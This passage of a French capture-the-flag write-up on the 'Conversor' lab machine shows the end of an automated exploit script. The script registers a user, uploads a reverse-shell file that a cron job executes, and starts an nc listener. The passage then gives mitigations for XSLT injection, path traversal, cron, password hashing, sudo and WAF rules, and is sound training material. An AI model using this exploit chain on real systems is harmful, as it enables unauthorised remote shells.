+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> r<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>Fore<span style="color:#f92672">.</span>GREEN<span style="color:#e6db74">}</span><span style="color:#e6db74">[+] Payload uploaded successfully</span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>Fore<span style="color:#f92672">.</span>GREEN<span style="color:#e6db74">}</span><span style="color:#e6db74">[+] File location: /var/www/conversor.htb/scripts/pwned.py</span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>Fore<span style="color:#f92672">.</span>RED<span style="color:#e6db74">}</span><span style="color:#e6db74">[-] Upload failed with status: </span><span style="color:#e6db74">{</span>r<span style="color:#f92672">.</span>status_code<span style="color:#e6db74">}{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>Fore<span style="color:#f92672">.</span>RED<span style="color:#e6db74">}</span><span style="color:#e6db74">[-] Error during upload: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser(description<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Conversor HTB Automated Exploit&#39;</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-t&#39;</span>, <span style="color:#e6db74">&#39;--target&#39;</span>, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Target URL (e.g., http://10.10.11.92)&#39;</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-l&#39;</span>, <span style="color:#e6db74">&#39;--lhost&#39;</span>, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Local IP for reverse shell&#39;</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-p&#39;</span>, <span style="color:#e6db74">&#39;--lport&#39;</span>, type<span style="color:#f92672">=</span>int, default<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Local port for reverse shell (default: 4444)&#39;</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-u&#39;</span>, <span style="color:#e6db74">&#39;--username&#39;</span>, default<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;hacker&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Username to register (default: hacker)&#39;</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-w&#39;</span>, <span style="color:#e6db74">&#39;--password&#39;</span>, default<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;hacker123&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Password to use (default: hacker123)&#39;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    banner()
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    target <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>target<span style="color:#f92672">.</span>rstrip(<span style="color:#e6db74">&#39;/&#39;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Create session</span>
+</span></span><span style="display:flex;"><span>    session <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Step 1: Register</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> register_user(target, args<span style="color:#f92672">.</span>username, args<span style="color:#f92672">.</span>password):
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>Fore<span style="color:#f92672">.</span>RED<span style="color:#e6db74">}</span><span style="color:#e6db74">[!] Failed at registration step</span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Step 2: Login</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> login_user(session, target, args<span style="color:#f92672">.</span>username, args<span style="color:#f92672">.</span>password):
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>Fore<span style="color:#f92672">.</span>RED<span style="color:#e6db74">}</span><span style="color:#e6db74">[!] Failed at login step</span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Step 3: Upload shell</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> upload_shell(session, target, args<span style="color:#f92672">.</span>lhost, args<span style="color:#f92672">.</span>lport):
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>Fore<span style="color:#f92672">.</span>RED<span style="color:#e6db74">}</span><span style="color:#e6db74">[!] Failed at upload step</span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Success message</span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">{</span>Fore<span style="color:#f92672">.</span>GREEN<span style="color:#e6db74">}{</span><span style="color:#e6db74">&#39;=&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">60</span><span style="color:#e6db74">}{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>Fore<span style="color:#f92672">.</span>GREEN<span style="color:#e6db74">}</span><span style="color:#e6db74">[✓] Exploit completed successfully!</span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>Fore<span style="color:#f92672">.</span>GREEN<span style="color:#e6db74">}{</span><span style="color:#e6db74">&#39;=&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">60</span><span style="color:#e6db74">}{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>Fore<span style="color:#f92672">.</span>CYAN<span style="color:#e6db74">}</span><span style="color:#e6db74">[i] Next steps:</span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;    1. Start your listener: </span><span style="color:#e6db74">{</span>Fore<span style="color:#f92672">.</span>YELLOW<span style="color:#e6db74">}</span><span style="color:#e6db74">rlwrap nc -lnvp </span><span style="color:#e6db74">{</span>args<span style="color:#f92672">.</span>lport<span style="color:#e6db74">}{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;    2. Wait for cron job execution (max 60 seconds)&#34;</span>)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;    3. You should receive a shell as www-data</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div><h3 id="utilisation-du-script">Utilisation du script<a hidden class="anchor" aria-hidden="true" href="#utilisation-du-script">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Installation des dépendances</span>
+</span></span><span style="display:flex;"><span>pip3 install requests colorama
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Exécution</span>
+</span></span><span style="display:flex;"><span>python3 exploit.py -t http://10.10.11.92 -l 10.10.14.X -p <span style="color:#ae81ff">4444</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Démarrer le listener dans un autre terminal</span>
+</span></span><span style="display:flex;"><span>rlwrap nc -lnvp <span style="color:#ae81ff">4444</span>
+</span></span></code></pre></div><hr>
+<h2 id="-recommandations-et-mitigations">🛡️ Recommandations et mitigations<a hidden class="anchor" aria-hidden="true" href="#-recommandations-et-mitigations">#</a></h2>
+<h3 id="1-xslt-parser-security">1. XSLT Parser Security<a hidden class="anchor" aria-hidden="true" href="#1-xslt-parser-security">#</a></h3>
+<p><strong>Problème</strong> : Le parser XSLT accepte la fonction <code>document()</code> permettant l&rsquo;accès aux fichiers locaux.</p>
+<p><strong>Mitigation</strong> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> lxml <span style="color:#f92672">import</span> etree
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Configuration sécurisée du parser XSLT</span>
+</span></span><span style="display:flex;"><span>xslt_parser <span style="color:#f92672">=</span> etree<span style="color:#f92672">.</span>XMLParser(
+</span></span><span style="display:flex;"><span>    resolve_entities<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
+</span></span><span style="display:flex;"><span>    no_network<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>,
+</span></span><span style="display:flex;"><span>    dtd_validation<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
+</span></span><span style="display:flex;"><span>    load_dtd<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Désactiver l&#39;accès aux fonctions dangereuses</span>
+</span></span><span style="display:flex;"><span>xslt_access_control <span style="color:#f92672">=</span> etree<span style="color:#f92672">.</span>XSLTAccessControl(
+</span></span><span style="display:flex;"><span>    read_file<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
+</span></span><span style="display:flex;"><span>    write_file<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
+</span></span><span style="display:flex;"><span>    create_dir<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
+</span></span><span style="display:flex;"><span>    read_network<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
+</span></span><span style="display:flex;"><span>    write_network<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Parser sécurisé</span>
+</span></span><span style="display:flex;"><span>xslt_tree <span style="color:#f92672">=</span> etree<span style="color:#f92672">.</span>parse(xslt_path, xslt_parser)
+</span></span><span style="display:flex;"><span>transform <span style="color:#f92672">=</span> etree<span style="color:#f92672">.</span>XSLT(xslt_tree, access_control<span style="color:#f92672">=</span>xslt_access_control)
+</span></span></code></pre></div><h3 id="2-path-traversal-prevention">2. Path Traversal Prevention<a hidden class="anchor" aria-hidden="true" href="#2-path-traversal-prevention">#</a></h3>
+<p><strong>Problème</strong> : Aucune validation des noms de fichiers.</p>
+<p><strong>Mitigation</strong> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> werkzeug.utils <span style="color:#f92672">import</span> secure_filename
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">safe_join</span>(base_dir, filename):
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;Safely join base directory with filename&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Sanitize filename</span>
+</span></span><span style="display:flex;"><span>    filename <span style="color:#f92672">=</span> secure_filename(filename)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Remove any path traversal sequences</span>
+</span></span><span style="display:flex;"><span>    filename <span style="color:#f92672">=</span> filename<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;../&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;..</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Only allow alphanumeric, dash, underscore, and dot</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> re<span style="color:#f92672">.</span><span style="color:#66d9ef">match</span>(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;^[\w\-\.]+$&#39;</span>, filename):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(<span style="color:#e6db74">&#34;Invalid filename&#34;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Join paths</span>
+</span></span><span style="display:flex;"><span>    filepath <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(base_dir, filename)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Verify the resulting path is within base_dir</span>
+</span></span><span style="display:flex;"><span>    filepath <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>abspath(filepath)
+</span></span><span style="display:flex;"><span>    base_dir <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>abspath(base_dir)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> filepath<span style="color:#f92672">.</span>startswith(base_dir):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(<span style="color:#e6db74">&#34;Path traversal detected&#34;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> filepath
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Utilisation</span>
+</span></span><span style="display:flex;"><span>xml_path <span style="color:#f92672">=</span> safe_join(UPLOAD_FOLDER, xml_file<span style="color:#f92672">.</span>filename)
+</span></span><span style="display:flex;"><span>xslt_path <span style="color:#f92672">=</span> safe_join(UPLOAD_FOLDER, xslt_file<span style="color:#f92672">.</span>filename)
+</span></span></code></pre></div><h3 id="3-cron-job-security">3. Cron Job Security<a hidden class="anchor" aria-hidden="true" href="#3-cron-job-security">#</a></h3>
+<p><strong>Problème</strong> : Exécution automatique de tous les fichiers Python dans un répertoire uploadable.</p>
+<p><strong>Mitigation</strong> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Option 1 : Utiliser une whitelist de scripts spécifiques</span>
+</span></span><span style="display:flex;"><span>* * * * * www-data /usr/bin/python3 /var/www/conversor.htb/scripts/cleanup.py
+</span></span><span style="display:flex;"><span>* * * * * www-data /usr/bin/python3 /var/www/conversor.htb/scripts/maintenance.py
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Option 2 : Vérifier les permissions et propriétaire avant exécution</span>
+</span></span><span style="display:flex;"><span>* * * * * root <span style="color:#66d9ef">for</span> f in /var/www/conversor.htb/scripts/*.py; <span style="color:#66d9ef">do</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>stat -c <span style="color:#e6db74">&#39;%U&#39;</span> <span style="color:#e6db74">&#34;</span>$f<span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;root&#34;</span> <span style="color:#f92672">]</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>stat -c <span style="color:#e6db74">&#39;%a&#39;</span> <span style="color:#e6db74">&#34;</span>$f<span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;755&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>        python3 <span style="color:#e6db74">&#34;</span>$f<span style="color:#e6db74">&#34;</span>; <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    <span style="color:#66d9ef">fi</span>; <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#66d9ef">done</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Option 3 : Séparer complètement les répertoires</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># uploads/ → accessible en écriture par www-data</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># scripts/ → accessible en écriture uniquement par root, exécutable par www-data</span>
+</span></span></code></pre></div><h3 id="4-password-hashing">4. Password Hashing<a hidden class="anchor" aria-hidden="true" href="#4-password-hashing">#</a></h3>
+<p><strong>Problème</strong> : Utilisation de MD5 pour hasher les mots de passe.</p>
+<p><strong>Mitigation</strong> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> werkzeug.security <span style="color:#f92672">import</span> generate_password_hash, check_password_hash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Lors de l&#39;enregistrement</span>
+</span></span><span style="display:flex;"><span>hashed_password <span style="color:#f92672">=</span> generate_password_hash(
+</span></span><span style="display:flex;"><span>    password,
+</span></span><span style="display:flex;"><span>    method<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;pbkdf2:sha256&#39;</span>,
+</span></span><span style="display:flex;"><span>    salt_length<span style="color:#f92672">=</span><span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># OU utiliser bcrypt (recommandé)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> bcrypt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>hashed_password <span style="color:#f92672">=</span> bcrypt<span style="color:#f92672">.</span>hashpw(
+</span></span><span style="display:flex;"><span>    password<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-8&#39;</span>),
+</span></span><span style="display:flex;"><span>    bcrypt<span style="color:#f92672">.</span>gensalt(rounds<span style="color:#f92672">=</span><span style="color:#ae81ff">12</span>)
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Lors de la vérification</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> bcrypt<span style="color:#f92672">.</span>checkpw(password<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-8&#39;</span>), stored_hash):
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Password correct</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">pass</span>
+</span></span></code></pre></div><h3 id="5-sudo-configuration-pour-needrestart">5. Sudo Configuration pour needrestart<a hidden class="anchor" aria-hidden="true" href="#5-sudo-configuration-pour-needrestart">#</a></h3>
+<p><strong>Problème</strong> : L&rsquo;option <code>-c</code> permet d&rsquo;exécuter du code Perl arbitraire.</p>
+<p><strong>Mitigation</strong> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># /etc/sudoers.d/needrestart</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Option 1 : Restreindre l&#39;option -c</span>
+</span></span><span style="display:flex;"><span>fismathack ALL<span style="color:#f92672">=(</span>ALL<span style="color:#f92672">)</span> NOPASSWD: /usr/sbin/needrestart -v
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Option 2 : Utiliser un wrapper script</span>
+</span></span><span style="display:flex;"><span>fismathack ALL<span style="color:#f92672">=(</span>ALL<span style="color:#f92672">)</span> NOPASSWD: /usr/local/bin/safe-needrestart
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># /usr/local/bin/safe-needrestart</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash</span>
+</span></span><span style="display:flex;"><span>/usr/sbin/needrestart -c /etc/needrestart/needrestart.conf
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Option 3 : Mettre à jour needrestart vers une version patchée</span>
+</span></span><span style="display:flex;"><span>apt update <span style="color:#f92672">&amp;&amp;</span> apt upgrade needrestart
+</span></span></code></pre></div><h3 id="6-web-application-firewall-waf">6. Web Application Firewall (WAF)<a hidden class="anchor" aria-hidden="true" href="#6-web-application-firewall-waf">#</a></h3>
+<p>Ajouter des règles ModSecurity pour détecter :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-apache" data-lang="apache"><span style="display:flex;"><span><span style="color:#75715e"># /etc/modsecurity/custom_rules.conf</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Détecter les path traversal</span>
+</span></span><span style="display:flex;"><span>SecRule ARGS <span style="color:#e6db74">&#34;@contains ../&#34;</span> \
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;id:1001,phase:2,deny,status:403,msg:&#39;Path traversal detected&#39;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Détecter les tentatives XSLT injection</span>
+</span></span><span style="display:flex;"><span>SecRule REQUEST_BODY <span style="color:#e6db74">&#34;@rx document\s*\(&#34;</span> \
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;id:1002,phase:2,deny,status:403,msg:&#39;XSLT injection attempt&#39;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Limiter la taille des uploads</span>
+</span></span><span style="display:flex;"><span>SecRequestBodyLimit <span style="color:#ae81ff">5242880</span>  # <span style="color:#ae81ff">5</span>MB max
+</span></span></code></pre></div><h3 id="7-logging-et-monitoring">7. Logging et Monitoring<a hidden class="anchor" aria-hidden="true" href="#7-logging-et-monitoring">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> logging
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> logging.handlers <span style="color:#f92672">import</span> SysLogHandler
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Configuration du logging</span>
+</span></span><span style="display:flex;"><span>logger <span style="color:#f92672">=</span> logging<span style="color:#f92672">.</span>getLogger(<span style="color:#e6db74">&#39;conversor&#39;</span>)
+</span></span><span style="display:flex;"><span>logger<span style="color:#f92672">.</span>setLevel(logging<span style="color:#f92672">.</span>INFO)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Handler pour syslog</span>
+</span></span><span style="display:flex;"><span>syslog_handler <span style="color:#f92672">=</span> SysLogHandler(address<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;/dev/log&#39;</span>)
+</span></span><span style="display:flex;"><span>logger<span style="color:#f92672">.</span>addHandler(syslog_handler)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Logs lors des uploads</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/convert&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;POST&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">convert</span>():
